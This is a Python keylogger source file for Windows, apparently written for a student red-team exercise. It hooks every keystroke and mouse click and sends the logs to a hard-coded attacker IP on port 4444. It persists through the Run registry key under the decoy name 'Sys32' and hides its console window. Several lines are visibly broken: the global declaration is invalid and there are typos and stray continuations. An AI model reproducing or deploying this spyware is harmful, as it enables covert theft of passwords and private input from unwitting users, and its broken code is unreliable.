#!/usr/bin/python
# Python Keylogger Tool
# Author: Finn Cappelli
# CDT Team Echo, Spring 2025

import sys
import win32api, pythoncom
import pyHook, os, time, random, smtplib, string, base64, socket
from _winreg import *

KALI_PRIV_IP = '192.168.21.2'
KALI_PORT = 4444

global t = ""

def send_logs(data):
    try: 
        with socket.socket(AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((KALI_PRIV_IP, KALI_PORT))
            client_socket.sendall(data.encode('utf-8'))
    except Exception as e:
        print(f"Failed to send logs: {e}")

def addStartup(): # add the file to startup registry key
    filepath = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_filepath = file_path + '\\' + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    keyToChange = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(keyToChange, 'Sys32', 0, REG_SZ, new_filepath)

def hide():
    import win32console
    import win32gui

    win = win32console.GetConsoleWindow()
    wind32gui.ShowWindow(win, 0)

addStartup()
hide()

def OnMouseEvent(event):
    data = '\n[' + str(time.ctime().split('')[3]) + ']' \ + ' WindowName: ' + str(event.WindowName)
    data += '\n\tButton: ' + str(event.MessageName)
    data += '\n\tClicked in (Position):' + str(event.Position) + '\n'

    global t
    t = t + data
    if len(t) > 500:
        send_logs(t)
        t = ''

    return True

def OnKeybEvent(event):
    data = '\n[' + str(time.ctime().split('')[3]) + ']' \ + ' WindowName: ' + str(event.WindowName)
    data += '\n\tKey pressed: ' + str(event.Key) + '\n'

    global t
    t = t + data
    if len(t) > 500:
        send_logs(t)
        t = ''
    return True

hook = pyHook.HookManager()
hook.MouseAllButtonsDown = OnMouseEvent
hook.KeyDown = OnKeybEvent
hook.HookKeyboard()
hook.HookMouse()

pythoncom.PumpMessages()
